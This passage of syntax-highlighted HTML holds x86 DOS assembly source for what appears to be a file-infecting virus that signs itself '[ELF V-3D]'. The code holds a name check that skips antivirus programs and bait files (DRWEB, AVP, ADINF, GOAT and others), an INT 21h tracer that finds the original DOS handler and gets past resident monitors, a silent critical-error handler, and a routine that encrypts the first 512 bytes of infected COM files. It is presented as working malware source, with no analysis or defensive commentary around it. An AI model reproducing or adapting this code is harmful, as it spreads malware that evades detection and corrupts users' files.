    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">A</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[ELF V-3D]'</span><span class="sc0">

</span><span class="sc5">cmp_name</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">cld</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">   
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">
      </span><span class="sc6">cld</span><span class="sc0">
      </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">jcxz</span><span class="sc0"> </span><span class="sc5">__4</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">; cx = ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">__6</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__5</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__5</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> 
      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">__6</span><span class="sc0">
</span><span class="sc5">__5</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bad_namez</span><span class="sc0">
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">lods</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">__7</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
      </span><span class="sc6">lods</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0">  </span><span class="sc5">__3</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">__7</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">__4</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__2</span><span class="sc0">  

</span><span class="sc5">bad_namez</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'AID'</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'DRWEB'</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc12">'ADINF'</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'AVP'</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'NDD'</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc12">'SCA'</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc12">'GOAT'</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Enuns</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ENUNS'</span><span class="sc0">

</span><span class="sc5">Int24</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
      </span><span class="sc6">Iret</span><span class="sc0">

</span><span class="sc5">Init</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
      </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_Ret</span><span class="sc4">]</span><span class="sc0"> 
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0"> </span><span class="sc8">Bp</span><span class="sc0">
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">
      </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">
      </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0"> 
      </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3524h</span><span class="sc0">
      </span><span class="sc6">PushF</span><span class="sc0"> 
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
      </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Int_3h</span><span class="sc0">
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">       
      </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3503h</span><span class="sc0">
      </span><span class="sc6">PushF</span><span class="sc0"> 
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
      </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Int_3h</span><span class="sc0">
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0">
      </span><span class="sc6">Pop</span><span class="sc0">  </span><span class="sc8">Ds</span><span class="sc0">
      </span><span class="sc6">Lea</span><span class="sc0">  </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int_3h</span><span class="sc0">
      </span><span class="sc6">Mov</span><span class="sc0">  </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2503h</span><span class="sc0">
      </span><span class="sc6">PushF</span><span class="sc0"> 
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
      </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Int_3h</span><span class="sc0">
      </span><span class="sc6">Mov</span><span class="sc0">  </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
      </span><span class="sc6">Lea</span><span class="sc0">  </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int24</span><span class="sc0">
      </span><span class="sc6">Int</span><span class="sc0">  </span><span class="sc2">3h</span><span class="sc0">
      </span><span class="sc6">Mov</span><span class="sc0">  </span><span class="sc8">Ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0">
      </span><span class="sc6">Mov</span><span class="sc0">  </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">  
      </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_Ret</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc9">Endp</span><span class="sc0">

</span><span class="sc5">Done</span><span class="sc0">  </span><span class="sc9">Proc</span><span class="sc0">
      </span><span class="sc6">Pop</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_Ret</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">Pop</span><span class="sc0">  </span><span class="sc8">Dx</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
      </span><span class="sc6">Mov</span><span class="sc0">  </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2503h</span><span class="sc0">
      </span><span class="sc6">Int</span><span class="sc0">  </span><span class="sc2">3H</span><span class="sc0">
      </span><span class="sc6">Pop</span><span class="sc0">  </span><span class="sc8">Dx</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
      </span><span class="sc6">Mov</span><span class="sc0">  </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
      </span><span class="sc6">PushF</span><span class="sc0"> 
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
      </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Int_3h</span><span class="sc0">
      </span><span class="sc6">Pop</span><span class="sc0">  </span><span class="sc8">Es</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
      </span><span class="sc6">Pop</span><span class="sc0">  </span><span class="sc8">Bp</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">_Ret</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc9">Endp</span><span class="sc0">

</span><span class="sc1">;   512   </span><span class="sc0">

</span><span class="sc5">crypt_com</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buf_seg</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">org</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">OfsCom</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0FB00h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">__1</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
      </span><span class="sc9">org</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">KeyCom</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">__2</span><span class="sc0">      
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">OfsCom</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">   
      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">int_3h</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">dos_ofs_21</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dos_seg_21</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 

</span><span class="sc5">trace</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc1">; pushf</span><span class="sc0">
       </span><span class="sc1">; push cs</span><span class="sc0">
       </span><span class="sc1">; push ip</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">delta1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta1</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0B8h</span><span class="sc0">
</span><span class="sc5">dos_seg</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">36h</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0">  </span><span class="sc5">not_me</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_seg_21</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">36h</span><span class="sc0"> 
       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> 
       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_ofs_21</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">  
       </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">not_me</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">    
       </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0">
       </span><span class="sc6">iret</span><span class="sc0"> 

</span><span class="sc5">trace_int21</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3501h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">trace</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2501h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">52h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dos_seg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2501h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">find</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc1">; pushf</span><span class="sc0">
       </span><span class="sc1">; push cs</span><span class="sc0">
       </span><span class="sc1">; push ip</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">sifilis</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">__Err</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">init</span><span class="sc0">
